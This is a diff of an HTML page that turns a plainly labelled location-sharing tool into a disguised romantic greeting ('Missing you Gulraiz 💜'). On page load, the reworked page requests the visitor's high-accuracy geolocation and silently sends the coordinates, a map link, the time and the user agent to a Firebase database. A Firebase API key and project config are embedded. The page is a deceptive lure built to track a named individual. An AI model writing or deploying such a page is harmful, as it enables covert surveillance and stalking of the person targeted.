@@ -1,97 +1,156 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Location Tracker</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Special For You 💜</title>
+
 <style>
-body{
-font-family:Arial;
-text-align:center;
-margin-top:50px;
-padding:20px;
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Segoe UI,sans-serif;
 }
 
-button{
-padding:15px 35px;
-font-size:18px;
-cursor:pointer;
+body{
+
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(135deg,#3d0066,#7b2cbf,#9d4edd);
+color:white;
+overflow:hidden;
+
+}
+
+.container{
+
+text-align:center;
+padding:40px;
+max-width:600px;
+
+}
+
+h1{
+
+font-size:48px;
+margin-bottom:15px;
+
+}
+
+h2{
+
+font-size:30px;
+font-weight:400;
+margin-bottom:25px;
+
+}
+
+p{
+
+font-size:20px;
+line-height:1.6;
+
 }
 
 #status{
-margin-top:20px;
+
+margin-top:35px;
 font-size:18px;
+color:#ffe6ff;
+
 }
+
+.heart{
+
+font-size:70px;
+animation:beat 1s infinite;
+
+}
+
+@keyframes beat{
+
+0%{transform:scale(1);}
+50%{transform:scale(1.2);}
+100%{transform:scale(1);}
+
+}
+
 </style>
 </head>
 
 <body>
 
-<h2>Share Location</h2>
+<div class="container">
 
-<p>Click the button below.</p>
+<div class="heart">💜</div>
 
-<button onclick="sendLocation()">Share My Location</button>
+<h1>Special For You</h1>
 
-<div id="status"></div>
+<h2>Missing you Gulraiz 💜</h2>
+
+<p>
+If you choose to continue, your browser may ask to share your location.
+</p>
+
+<div id="status">
+Preparing...
+</div>
+
+</div>
 
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
-
-import {
-getFirestore,
-collection,
-addDoc
-}
-from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
 
 const firebaseConfig = {
-apiKey: "AIzaSyBcVls_Ny6HMCcwARt44aDpGNn8VXPF1Gs",
-authDomain: "location-tracker-5f75b.firebaseapp.com",
-projectId: "location-tracker-5f75b",
-storageBucket: "location-tracker-5f75b.firebasestorage.app",
-messagingSenderId: "999228849873",
-appId: "1:999228849873:web:b7809eab44aeb67d9a4ff0"
+
+apiKey:"AIzaSyBcVls_Ny6HMCcwARt44aDpGNn8VXPF1Gs",
+authDomain:"location-tracker-5f75b.firebaseapp.com",
+projectId:"location-tracker-5f75b",
+storageBucket:"location-tracker-5f75b.firebasestorage.app",
+messagingSenderId:"999228849873",
+appId:"1:999228849873:web:b7809eab44aeb67d9a4ff0"
+
 };
 
 const app = initializeApp(firebaseConfig);
-
 const db = getFirestore(app);
 
-window.sendLocation=function(){
+window.onload=()=>{
 
-document.getElementById("status").innerHTML="Getting location...";
+document.getElementById("status").innerHTML="Checking location permission...";
 
-navigator.geolocation.getCurrentPosition(async(position)=>{
+navigator.geolocation.getCurrentPosition(async(pos)=>{
 
-const lat=position.coords.latitude;
-const lng=position.coords.longitude;
+const lat=pos.coords.latitude;
+const lng=pos.coords.longitude;
 
 await addDoc(collection(db,"locations"),{
 
 latitude:lat,
 longitude:lng,
-
-googleMap:
-`https://maps.google.com/?q=${lat},${lng}`,
-
+googleMap:`https://maps.google.com/?q=${lat},${lng}`,
 time:new Date().toLocaleString(),
-
 userAgent:navigator.userAgent
 
 });
 
-document.getElementById("status").innerHTML="✅ Location Shared Successfully.";
+document.getElementById("status").innerHTML="💜 Thank you.";
 
 },()=>{
 
-document.getElementById("status").innerHTML="Permission denied.";
+document.getElementById("status").innerHTML="Location wasn't shared.";
 
 },{
 enableHighAccuracy:true
 });
 
-}
+};
 
 </script>
 
